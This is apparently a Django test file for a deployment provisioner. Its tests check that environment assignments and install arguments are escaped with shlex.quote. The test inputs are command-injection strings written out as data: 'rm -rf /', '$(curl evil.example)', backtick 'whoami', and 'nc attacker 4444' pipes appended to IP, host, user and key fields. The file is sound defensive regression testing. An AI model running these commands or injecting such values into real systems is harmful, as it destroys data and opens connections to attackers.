import inspect
import shlex

from django.test import SimpleTestCase

from apps.deployments.services import provisioner


class Finding39ProvisionerShlexQuoteTests(SimpleTestCase):
    def test_shell_env_assignments_quotes_metacharacters(self):
        evil_ip = "1.2.3.4; rm -rf /"
        evil_subst = "$(curl evil.example)"
        rendered = provisioner._shell_env_assignments({
            "MASTER_IP": evil_ip,
            "SMSLY_NODE_HOST": evil_subst,
            "PLAIN": "ok",
        })
        self.assertIn(f"MASTER_IP={shlex.quote(evil_ip)}", rendered)
        self.assertIn(f"SMSLY_NODE_HOST={shlex.quote(evil_subst)}", rendered)
        self.assertIn("PLAIN=ok", rendered)
        for piece in rendered.split():
            if "=" in piece:
                value = piece.split("=", 1)[1]
                if value and not value.startswith("'") and not value[0].isalnum() and value[0] not in {"_", "-", "/", "."}:
                    self.fail(
                        f"Unquoted value with shell-meta start: {piece!r} in {rendered!r}"
                    )

    def test_shell_env_assignments_quotes_backticks_and_pipes(self):
        backtick_value = chr(96) + "whoami" + chr(96)
        pipe_value = "value | nc attacker 4444"
        rendered = provisioner._shell_env_assignments({
            "EVIL": backtick_value,
            "PIPE": pipe_value,
        })
        self.assertIn(f"EVIL={shlex.quote(backtick_value)}", rendered)
        self.assertIn(f"PIPE={shlex.quote(pipe_value)}", rendered)

    def test_install_args_str_uses_shlex_quote(self):
        source = inspect.getsource(provisioner)
        self.assertIn("install_args_str = \" \".join(shlex.quote(arg) for arg in install_args)", source)

    def test_shell_env_assignments_skips_none_values(self):
        rendered = provisioner._shell_env_assignments({
            "DROP_ME": None,
            "KEEP_ME": "yes",
        })
        self.assertNotIn("DROP_ME", rendered)
        self.assertIn("KEEP_ME=yes", rendered)

    def test_special_chars_in_host_do_not_break_install_cmd(self):
        evil_host = "evil.example.com; nc attacker 4444"
        evil_user = "$(touch /tmp/pwn)"
        evil_key = "/tmp/key; rm -rf /"
        env = {
            "SMSLY_NODE_HOST": evil_host,
            "INSTALL_USER": evil_user,
            "SMSLY_KEY_FILENAME": evil_key,
        }
        rendered = provisioner._shell_env_assignments(env)

        for raw in (evil_host, evil_user, evil_key):
            self.assertIn(shlex.quote(raw), rendered)
        cmd = f"{rendered} bash /tmp/smsly-install.sh"
        parsed = shlex.split(cmd)
        self.assertIn(f"SMSLY_NODE_HOST={evil_host}", parsed)
        self.assertIn(f"INSTALL_USER={evil_user}", parsed)
        self.assertIn(f"SMSLY_KEY_FILENAME={evil_key}", parsed)

